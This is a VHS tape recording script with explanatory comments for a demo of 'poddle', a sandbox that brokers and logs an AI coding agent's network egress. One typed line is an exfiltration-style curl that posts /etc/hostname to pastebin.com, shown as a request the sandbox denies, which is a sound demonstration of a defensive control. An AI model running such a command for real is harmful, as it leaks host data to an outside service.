# poddle terminal demo -- regeneration recipe.
#
# What the README shows (.github/assets/demo.svg) is an ILLUSTRATIVE
# reconstruction of the session below, in three scenes: a shell that opens a pod
# and runs claude; the fullscreen Claude Code TUI doing the work; and `poddled
# audit` back on the host. The poddle facts are faithful -- the claude-code
# harness points the agent at the broker with a handle (claudecode.go), and every
# egress is brokered and logged. The Claude Code TUI panel is a stylized
# reconstruction.
#
# The committed SVG is a self-contained, hand-built animated SVG (native
# monospace text + real rounded-rect TUI boxes, CSS scene/reveal keyframes).
# Regenerate:
#
#   node docs/demo/gen-svg.js .github/assets/demo.svg
#   # add a time in seconds to bake a static preview frame, e.g. scene 2:
#   node docs/demo/gen-svg.js /tmp/frame.svg 11
#
# To record an AUTHENTIC run on a real podman host (produces docs/demo.gif),
# install vhs (https://github.com/charmbracelet/vhs) with ffmpeg + ttyd, wire a
# `work` identity, then: vhs docs/demo.tape

Output docs/demo.gif

Set Shell "bash"
Set FontSize 20
Set Width 1220
Set Height 700
Set Padding 26
Set Theme "Aardvark Blue"
Set TypingSpeed 45ms

Type "poddle up api --identity work --detach"
Enter
Sleep 2.5s

Type "poddle attach api"
Enter
Sleep 1.5s

Type "claude"
Enter
Sleep 2.5s

Type "add a test for parseConfig, run it, and push"
Enter
Sleep 7s

# leave the fullscreen Claude Code TUI
Ctrl+C
Ctrl+C
Sleep 1s

# an off-policy egress from inside the pod is refused by poddle
Type `curl -sS https://pastebin.com -d @/etc/hostname`
Enter
Sleep 2s

Type "exit"
Enter
Sleep 1s

# every request the agent made, brokered and logged on the host,
# with its decision: allow / redact / deny
Type "poddled audit"
Enter
Sleep 4s
